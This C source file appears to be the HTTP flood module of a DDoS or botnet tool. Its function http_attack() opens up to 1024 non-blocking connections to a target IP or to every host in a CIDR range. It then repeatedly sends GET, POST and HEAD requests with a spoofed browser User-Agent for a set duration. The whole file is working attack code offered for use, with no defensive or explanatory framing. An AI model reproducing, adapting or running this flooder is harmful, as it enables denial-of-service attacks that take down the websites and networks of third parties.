#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/time.h>
#include "headers/http_attack.h"

#define MAX_CONNECTIONS 1024

static void set_socket_options(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

void* http_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = params->target_addr.sin_port;
    target_addr.sin_addr = params->target_addr.sin_addr;

    char get_template[512], post_template[512], head_template[512];
    const char* user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110";
    const char* host = inet_ntoa(params->target_addr.sin_addr);
    
    snprintf(get_template, sizeof(get_template),
        "GET / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", host, user_agent);

    snprintf(post_template, sizeof(post_template),
        "POST / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 16\r\n"
        "\r\n"
        "data=random_data\r\n", host, user_agent);

    snprintf(head_template, sizeof(head_template),
        "HEAD / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", host, user_agent);

    int sockets[MAX_CONNECTIONS] = {0};
    int active_sockets = 0;
    
    srand(time(NULL));
    time_t end_time = time(NULL) + params->duration;
    struct timeval last_cleanup = {0, 0};
    if (params->cidr > 0) {
        uint32_t base = ntohl(params->base_ip);
        uint32_t mask = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);
        struct sockaddr_in target_addr_sub = target_addr;
        while (params->active && time(NULL) < end_time) {
            if (params->cidr == 32) {
                target_addr_sub.sin_addr.s_addr = htonl(start);

                while (active_sockets < MAX_CONNECTIONS) {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock < 0) break;
                    
                    set_socket_options(sock);
                    
                    int ret = connect(sock, (struct sockaddr*)&target_addr_sub, sizeof(target_addr_sub));
                    if (ret < 0 && errno != EINPROGRESS) {
                        close(sock);
                        continue;
                    }
                    
                    sockets[active_sockets++] = sock;
                }

                for (int i = 0; i < active_sockets; i++) {
                    int sock = sockets[i];
                    if (sock <= 0) continue;

                    if (params->http_method == 0) {
                        params->http_method = 1;
                    }

                    uint8_t available_methods = params->http_method;
                    int method_count = __builtin_popcount(available_methods);
                    int selected = rand() % method_count;
                    uint8_t chosen_method = 1;
                    
                    while (selected > 0 || (available_methods & chosen_method) == 0) {
                        chosen_method <<= 1;
                        if (available_methods & chosen_method) selected--;
                    }

                    const char* request;
                    size_t len;

                    switch (chosen_method) {
                        case 2: // POST
                            request = post_template;
                            len = strlen(post_template);
                            break;
                        case 4: // HEAD  
                            request = head_template;
                            len = strlen(head_template);
                            break;
                        default: // GET
                            request = get_template;
                            len = strlen(get_template);
                            break;
                    }

                    ssize_t sent = send(sock, request, len, MSG_NOSIGNAL | MSG_DONTWAIT);
                    
                    if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        close(sock);
                        sockets[i] = sockets[--active_sockets];
                        sockets[active_sockets] = 0;
                        i--;
                        continue;
                    }
                    
                    char discard[1024];
                    recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
                }
                
                struct timeval now;
                gettimeofday(&now, NULL);
                if (now.tv_sec - last_cleanup.tv_sec >= 1) {
                    for (int i = 0; i < active_sockets; i++) {
                        if (sockets[i] <= 0) continue;
                        
                        char test;
                        if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                            close(sockets[i]);
                            sockets[i] = sockets[--active_sockets];
                            sockets[active_sockets] = 0;
                            i--;
                        }
                    }
                    last_cleanup = now;
                }

                //usleep(1000);
            } else if (params->cidr == 31) {
                target_addr_sub.sin_addr.s_addr = htonl(start);

                while (active_sockets < MAX_CONNECTIONS) {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock < 0) break;
                    
                    set_socket_options(sock);
                    
                    int ret = connect(sock, (struct sockaddr*)&target_addr_sub, sizeof(target_addr_sub));
                    if (ret < 0 && errno != EINPROGRESS) {
                        close(sock);
                        continue;
                    }
                    
                    sockets[active_sockets++] = sock;
                }

                for (int i = 0; i < active_sockets; i++) {
                    int sock = sockets[i];
                    if (sock <= 0) continue;

                    if (params->http_method == 0) {
                        params->http_method = 1;
                    }

                    uint8_t available_methods = params->http_method;
                    int method_count = __builtin_popcount(available_methods);
                    int selected = rand() % method_count;
                    uint8_t chosen_method = 1;
                    
                    while (selected > 0 || (available_methods & chosen_method) == 0) {
                        chosen_method <<= 1;
                        if (available_methods & chosen_method) selected--;
                    }

                    const char* request;
                    size_t len;

                    switch (chosen_method) {
                        case 2: // POST
                            request = post_template;
                            len = strlen(post_template);
                            break;
                        case 4: // HEAD  
                            request = head_template;
                            len = strlen(head_template);
                            break;
                        default: // GET
                            request = get_template;
                            len = strlen(get_template);
                            break;
                    }

                    ssize_t sent = send(sock, request, len, MSG_NOSIGNAL | MSG_DONTWAIT);
                    
                    if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        close(sock);
                        sockets[i] = sockets[--active_sockets];
                        sockets[active_sockets] = 0;
                        i--;
                        continue;
                    }
                    
                    char discard[1024];
                    recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
                }
                
                target_addr_sub.sin_addr.s_addr = htonl(end);

                while (active_sockets < MAX_CONNECTIONS) {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock < 0) break;
                    
                    set_socket_options(sock);
                    
                    int ret = connect(sock, (struct sockaddr*)&target_addr_sub, sizeof(target_addr_sub));
                    if (ret < 0 && errno != EINPROGRESS) {
                        close(sock);
                        continue;
                    }
                    
                    sockets[active_sockets++] = sock;
                }

                for (int i = 0; i < active_sockets; i++) {
                    int sock = sockets[i];
                    if (sock <= 0) continue;

                    if (params->http_method == 0) {
                        params->http_method = 1;
                    }

                    uint8_t available_methods = params->http_method;
                    int method_count = __builtin_popcount(available_methods);
                    int selected = rand() % method_count;
                    uint8_t chosen_method = 1;
                    
                    while (selected > 0 || (available_methods & chosen_method) == 0) {
                        chosen_method <<= 1;
                        if (available_methods & chosen_method) selected--;
                    }

                    const char* request;
                    size_t len;

                    switch (chosen_method) {
                        case 2: // POST
                            request = post_template;
                            len = strlen(post_template);
                            break;
                        case 4: // HEAD  
                            request = head_template;
                            len = strlen(head_template);
                            break;
                        default: // GET
                            request = get_template;
                            len = strlen(get_template);
                            break;
                    }

                    ssize_t sent = send(sock, request, len, MSG_NOSIGNAL | MSG_DONTWAIT);
                    
                    if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        close(sock);
                        sockets[i] = sockets[--active_sockets];
                        sockets[active_sockets] = 0;
                        i--;
                        continue;
                    }
                    
                    char discard[1024];
                    recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
                }
                
                struct timeval now;
                gettimeofday(&now, NULL);
                if (now.tv_sec - last_cleanup.tv_sec >= 1) {
                    for (int i = 0; i < active_sockets; i++) {
                        if (sockets[i] <= 0) continue;
                        
                        char test;
                        if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                            close(sockets[i]);
                            sockets[i] = sockets[--active_sockets];
                            sockets[active_sockets] = 0;
                            i--;
                        }
                    }
                    last_cleanup = now;
                }

                //usleep(1000);
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    target_addr_sub.sin_addr.s_addr = htonl(ip);

                    while (active_sockets < MAX_CONNECTIONS) {
                        int sock = socket(AF_INET, SOCK_STREAM, 0);
                        if (sock < 0) break;
                        
                        set_socket_options(sock);
                        
                        int ret = connect(sock, (struct sockaddr*)&target_addr_sub, sizeof(target_addr_sub));
                        if (ret < 0 && errno != EINPROGRESS) {
                            close(sock);
                            continue;
                        }
                        
                        sockets[active_sockets++] = sock;
                    }

                    for (int i = 0; i < active_sockets; i++) {
                        int sock = sockets[i];
                        if (sock <= 0) continue;

                        if (params->http_method == 0) {
                            params->http_method = 1;
                        }

                        uint8_t available_methods = params->http_method;
                        int method_count = __builtin_popcount(available_methods);
                        int selected = rand() % method_count;
                        uint8_t chosen_method = 1;
                        
                        while (selected > 0 || (available_methods & chosen_method) == 0) {
                            chosen_method <<= 1;
                            if (available_methods & chosen_method) selected--;
                        }

                        const char* request;
                        size_t len;

                        switch (chosen_method) {
                            case 2: // POST
                                request = post_template;
                                len = strlen(post_template);
                                break;
                            case 4: // HEAD  
                                request = head_template;
                                len = strlen(head_template);
                                break;
                            default: // GET
                                request = get_template;
                                len = strlen(get_template);
                                break;
                        }

                        ssize_t sent = send(sock, request, len, MSG_NOSIGNAL | MSG_DONTWAIT);
                        
                        if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            close(sock);
                            sockets[i] = sockets[--active_sockets];
                            sockets[active_sockets] = 0;
                            i--;
                            continue;
                        }
                        
                        char discard[1024];
                        recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
                    }
                    
                    struct timeval now;
                    gettimeofday(&now, NULL);
                    if (now.tv_sec - last_cleanup.tv_sec >= 1) {
                        for (int i = 0; i < active_sockets; i++) {
                            if (sockets[i] <= 0) continue;
                            
                            char test;
                            if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                                close(sockets[i]);
                                sockets[i] = sockets[--active_sockets];
                                sockets[active_sockets] = 0;
                                i--;
                            }
                        }
                        last_cleanup = now;
                    }

                    //usleep(1000);
                }
            }
        }
    } else {
        while (params->active && time(NULL) < end_time) {
            while (active_sockets < MAX_CONNECTIONS) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) break;
                
                set_socket_options(sock);
                
                int ret = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret < 0 && errno != EINPROGRESS) {
                    close(sock);
                    continue;
                }
                
                sockets[active_sockets++] = sock;
            }

            for (int i = 0; i < active_sockets; i++) {
                int sock = sockets[i];
                if (sock <= 0) continue;

                if (params->http_method == 0) {
                    params->http_method = 1;
                }

                uint8_t available_methods = params->http_method;
                int method_count = __builtin_popcount(available_methods);
                int selected = rand() % method_count;
                uint8_t chosen_method = 1;
                
                while (selected > 0 || (available_methods & chosen_method) == 0) {
                    chosen_method <<= 1;
                    if (available_methods & chosen_method) selected--;
                }

                const char* request;
                size_t len;

                switch (chosen_method) {
                    case 2: // POST
                        request = post_template;
                        len = strlen(post_template);
                        break;
                    case 4: // HEAD  
                        request = head_template;
                        len = strlen(head_template);
                        break;
                    default: // GET
                        request = get_template;
                        len = strlen(get_template);
                        break;
                }

                ssize_t sent = send(sock, request, len, MSG_NOSIGNAL | MSG_DONTWAIT);
                
                if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(sock);
                    sockets[i] = sockets[--active_sockets];
                    sockets[active_sockets] = 0;
                    i--;
                    continue;
                }
                
                char discard[1024];
                recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
            }
            
            struct timeval now;
            gettimeofday(&now, NULL);
            if (now.tv_sec - last_cleanup.tv_sec >= 1) {
                for (int i = 0; i < active_sockets; i++) {
                    if (sockets[i] <= 0) continue;
                    
                    char test;
                    if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                        close(sockets[i]);
                        sockets[i] = sockets[--active_sockets];
                        sockets[active_sockets] = 0;
                        i--;
                    }
                }
                last_cleanup = now;
            }

            //usleep(1000);
        }
    }

    for (int i = 0; i < active_sockets; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }
    
    return NULL;
}
